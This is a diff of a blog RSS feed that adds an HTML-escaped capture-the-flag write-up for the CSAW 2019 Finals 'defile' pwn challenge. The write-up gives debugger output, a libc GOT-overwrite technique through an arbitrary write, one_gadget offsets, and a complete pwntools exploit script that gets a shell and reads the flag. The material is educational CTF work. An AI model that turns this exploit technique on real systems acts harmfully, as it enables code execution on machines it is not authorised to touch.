@@ -1,4 +1,183 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on philomath213</title><link>https://philomath213.github.io/post/</link><description>Recent content in Posts on philomath213</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><lastBuildDate>Mon, 25 Mar 2019 11:59:39 +0100</lastBuildDate><atom:link href="https://philomath213.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>Securinets CTF Quals 2019 Special Revenge</title><link>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</link><pubDate>Mon, 25 Mar 2019 11:59:39 +0100</pubDate><guid>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</guid><description>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on philomath213</title><link>https://philomath213.github.io/post/</link><description>Recent content in Posts on philomath213</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><lastBuildDate>Mon, 11 Nov 2019 14:47:14 +0100</lastBuildDate><atom:link href="https://philomath213.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>CSAW CTF Finals 2019 - defile</title><link>https://philomath213.github.io/post/csaw-ctf-finals-2019-defile/</link><pubDate>Mon, 11 Nov 2019 14:47:14 +0100</pubDate><guid>https://philomath213.github.io/post/csaw-ctf-finals-2019-defile/</guid><description>
+&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;center&#34;&gt;Event&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Challenge&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Category&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align=&#34;center&#34;&gt;CSAW CTF Final 2019&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;defile&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;PWN&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;100&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;wild handlock main btw&lt;/p&gt;
+&lt;p&gt;nc host port&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;attachments&#34;&gt;Attachments&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/osirislab/CSAW-CTF-2019-Finals/blob/master/pwn/defile/defile?raw=true&#34; target=&#34;_blank&#34;&gt;defile&lt;/a&gt;
+&lt;a href=&#34;https://github.com/osirislab/CSAW-CTF-2019-Finals/raw/master/pwn/defile/libc.so.6&#34; target=&#34;_blank&#34;&gt;libc.so.6&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The binary is a dynamically linked ELF 64-bit executable, it has all protections enabled.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ file defile
+defile: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5631f2588790fa344f6f360d39819963f4f66d7f, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ checksec --file defile
+Arch: amd64-64-little
+RELRO: Full RELRO
+Stack: Canary found
+NX: NX enabled
+PIE: PIE enabled
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When running this binary, it will give you the address of &lt;code&gt;stdout&lt;/code&gt; in &lt;code&gt;libc&lt;/code&gt;, and ask for &lt;code&gt;How much do you want to write?&lt;/code&gt;, &lt;code&gt;Where do you want to write?&lt;/code&gt; and &lt;code&gt;What do you want to write?&lt;/code&gt;, then print &lt;code&gt;Bye!&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;So it looks like an intended vulnerability, we have an arbitrary write.&lt;/p&gt;
+&lt;p&gt;After analyzing the binary, I found that the binary have two functions: &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;get_number&lt;/code&gt;, the &lt;code&gt;get_number&lt;/code&gt; function simply read an &lt;code&gt;unsigned long&lt;/code&gt; from &lt;code&gt;stdin&lt;/code&gt; and return it, while the &lt;code&gt;main&lt;/code&gt; function ask for the input size then check if the &lt;code&gt;size &amp;lt;= 256&lt;/code&gt; otherwise it will print &lt;code&gt;That&#39;s just too much&lt;/code&gt;, then it ask for the address where to write and finally read the input by calling &lt;code&gt;read&lt;/code&gt; function with the parameters &lt;code&gt;read(0, buf, nbytes)&lt;/code&gt;, where &lt;code&gt;buf&lt;/code&gt; is the address we provided and &lt;code&gt;nbytes&lt;/code&gt; the size of input.&lt;/p&gt;
+&lt;p&gt;Since the binary is compiled with &lt;code&gt;full RELRO&lt;/code&gt; and &lt;code&gt;PIE&lt;/code&gt; enabled we can&amp;rsquo;t overwrite anything in the binary (e.g. &lt;code&gt;.got&lt;/code&gt;, &lt;code&gt;.dtors&lt;/code&gt;, &amp;hellip;) (as far as I know), so we need to find something else to overwrite, I noticed that there a call to &lt;code&gt;puts&lt;/code&gt; function after calling to &lt;code&gt;read&lt;/code&gt; function, So we need find some hooks or function pointers that &lt;code&gt;puts&lt;/code&gt; function use.&lt;/p&gt;
+&lt;p&gt;To do that I just set a break point at &lt;code&gt;main+228&lt;/code&gt; where &lt;code&gt;main&lt;/code&gt; call &lt;code&gt;puts&lt;/code&gt; then step into puts functions.&lt;/p&gt;
+&lt;p&gt;I noticed that &lt;code&gt;puts&lt;/code&gt; will call &lt;code&gt;__tunable_get_val@plt&lt;/code&gt; at &lt;code&gt;puts+13&lt;/code&gt;, make sure that you are debugging the target libc, not the local one.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;gef&amp;gt; set environment LD_PRELOAD ./libc.so.6
+gef&amp;gt; b *main+228 b *main+228
+Breakpoint 1 at 0xa19
+gef&amp;gt; r
+Starting program: /opt/ctf/defile
+Here&#39;s stdout:
+0x7fcd74c16760
+How much do you want to write?
+0
+Where do you want to write?
+0
+What do you want to write?
+...
+...
+gef&amp;gt; disas puts
+Dump of assembler code for function puts:
+0x00007fcd748aa9c0 &amp;lt;+0&amp;gt;: push r13
+0x00007fcd748aa9c2 &amp;lt;+2&amp;gt;: push r12
+0x00007fcd748aa9c4 &amp;lt;+4&amp;gt;: mov r12,rdi
+0x00007fcd748aa9c7 &amp;lt;+7&amp;gt;: push rbp
+0x00007fcd748aa9c8 &amp;lt;+8&amp;gt;: push rbx
+0x00007fcd748aa9c9 &amp;lt;+9&amp;gt;: sub rsp,0x8
+0x00007fcd748aa9cd &amp;lt;+13&amp;gt;: call 0x7fcd7484b100 &amp;lt;__tunable_get_val@plt+16&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Since the libc is not compiled with &lt;code&gt;Full RELRO&lt;/code&gt;, we can overwrite &lt;code&gt;__tunable_get_val&lt;/code&gt; &lt;code&gt;.got&lt;/code&gt; entry&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ checksec --file libc.so.6
+Arch: amd64-64-little
+RELRO: Partial RELRO
+Stack: Canary found
+NX: NX enabled
+PIE: PIE enabled
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In order to do that we need to calculate to offset between &lt;code&gt;stdout&lt;/code&gt; and &lt;code&gt;__tunable_get_val&lt;/code&gt; &lt;code&gt;.got&lt;/code&gt; entry, so step into &lt;code&gt;__tunable_get_val@plt+16&lt;/code&gt; and get the &lt;code&gt;.got&lt;/code&gt; entry address&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;...
+...
+gef&amp;gt; x/3i 0x7fcd7484b100
+=&amp;gt; 0x7fcd7484b100 &amp;lt;__tunable_get_val@plt+16&amp;gt;: jmp QWORD PTR [rip+0x3c9fa2] # 0x7fcd74c150a8
+0x7fcd7484b106 &amp;lt;__tunable_get_val@plt+22&amp;gt;: push 0x20
+0x7fcd7484b10b &amp;lt;__tunable_get_val@plt+27&amp;gt;: jmp 0x7fcd7484afd0
+...
+...
+gef&amp;gt; p 0x7fcd74c16760 - 0x7fcd74c150a8
+$1 = 0x16b8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here the &lt;code&gt;stdout&lt;/code&gt; address is &lt;code&gt;0x7fcd74c16760&lt;/code&gt;, the &lt;code&gt;.got&lt;/code&gt; entry address is: &lt;code&gt;0x7fcd74c150a8&lt;/code&gt; and the offset is &lt;code&gt;0x16b8&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Now we can control &lt;code&gt;RIP&lt;/code&gt; register, but we have only one shot, we can&amp;rsquo;t do any ROP chaining, so we need to find &lt;code&gt;one_gadget&lt;/code&gt; RCE in that libc (see &lt;a href=&#34;https://github.com/david942j/one_gadget&#34; target=&#34;_blank&#34;&gt;one_gadget&lt;/a&gt;).&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;$ one_gadget libc.so.6
+0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
+constraints:
+rcx == NULL
+0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
+constraints:
+[rsp+0x40] == NULL
+0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
+constraints:
+[rsp+0x70] == NULL
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;exploit&#34;&gt;Exploit&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;get the &lt;code&gt;stdout&lt;/code&gt; address&lt;/li&gt;
+&lt;li&gt;calculate the address of &lt;code&gt;__tunable_get_val&lt;/code&gt; got entry&lt;/li&gt;
+&lt;li&gt;calculate the libc base address&lt;/li&gt;
+&lt;li&gt;calculate the &lt;code&gt;one_gadget&lt;/code&gt; address&lt;/li&gt;
+&lt;li&gt;overwrite the got entry with &lt;code&gt;one_gadget&lt;/code&gt; address.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;exploit-code&#34;&gt;Exploit code&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import subprocess
+from pwn import *
+HOST = &amp;quot;pwn.chal.csaw.io&amp;quot;
+PORT = 1004
+def get_one_gadget(filename):
+return list(map(
+int,
+subprocess.check_output([&#39;one_gadget&#39;, &#39;--raw&#39;, filename]).split(b&#39; &#39;)
+))
+def exploit():
+offset = 0x16b8
+libc = ELF(&amp;quot;./libc.so.6&amp;quot;)
+stdout_libc = libc.sym[&amp;quot;_IO_2_1_stdout_&amp;quot;]
+log.info(&amp;quot;stdout_libc: 0x%08x&amp;quot; % stdout_libc)
+# one gadget RCE offsets
+one_gadgets = get_one_gadget(&#39;./libc.so.6&#39;)
+log.info(&amp;quot;one gadget RCE offsets: %s&amp;quot; % str(one_gadgets))
+target = remote(HOST, PORT)
+target.recvuntil(&amp;quot;Here&#39;s stdout:\n&amp;quot;)
+buf = target.recvline().strip()
+stdout = int(buf, 16)
+log.info(&amp;quot;stdout: 0x%08x&amp;quot; % stdout)
+libc_base = stdout - stdout_libc
+log.info(&amp;quot;libc_base: 0x%08x&amp;quot; % libc_base)
+got_entry = stdout - offset
+one_gadget_libc = libc_base + one_gadgets[2]
+log.info(&amp;quot;got_entry: 0x%08x&amp;quot; % got_entry)
+log.info(&amp;quot;one_gadget: 0x%08x&amp;quot; % one_gadget_libc)
+target.recvuntil(&amp;quot;do you want to write?\n&amp;quot;)
+target.sendline(&#39;8&#39;)
+target.recvuntil(&amp;quot;Where do you want to write?\n&amp;quot;)
+target.send(str(got_entry))
+target.recvuntil(&amp;quot;What do you want to write?\n&amp;quot;)
+target.sendline(p64(one_gadget_libc))
+target.sendline(&amp;quot;id;cat flag.txt;exit&amp;quot;)
+buf = target.recvall()
+if b&amp;quot;uid&amp;quot; in buf:
+log.success(buf.decode())
+else:
+log.failure(buf.decode())
+if __name__ == &amp;quot;__main__&amp;quot;:
+exploit()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;running-the-exploit&#34;&gt;Running the exploit&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;python exploit_defile.py
+[*] &#39;/home/philomath213/CSAW19_Finals/pwn/defile/libc.so.6&#39;
+Arch: amd64-64-little
+RELRO: Partial RELRO
+Stack: Canary found
+NX: NX enabled
+PIE: PIE enabled
+[*] stdout_libc: 0x003ec760
+[*] one gadget RCE offsets: [324293, 324386, 1090444]
+[+] Opening connection to pwn.chal.csaw.io on port 1004: Done
+[*] stdout: 0x7f0fad3a8760
+[*] libc_base: 0x7f0facfbc000
+[*] got_entry: 0x7f0fad3a70a8
+[*] one_gadget: 0x7f0fad0c638c
+[+] Receiving all data: Done (88B)
+[*] Closed connection to pwn.chal.csaw.io port 1004
+[+] uid=1000(defile) gid=1000(defile) groups=1000(defile)
+flag{me_you_in_room_1337_tonight}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;flag&#34;&gt;Flag&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{me_you_in_room_1337_tonight}&lt;/p&gt;
+&lt;/blockquote&gt;</description></item><item><title>Securinets CTF Quals 2019 Special Revenge</title><link>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</link><pubDate>Mon, 25 Mar 2019 11:59:39 +0100</pubDate><guid>https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/</guid><description>
 &lt;h1 id=&#34;securinets-ctf-quals-2019-special-revenge-writeup&#34;&gt;Securinets CTF Quals 2019 - Special Revenge WriteUp&lt;/h1&gt;
 &lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
 &lt;table&gt;
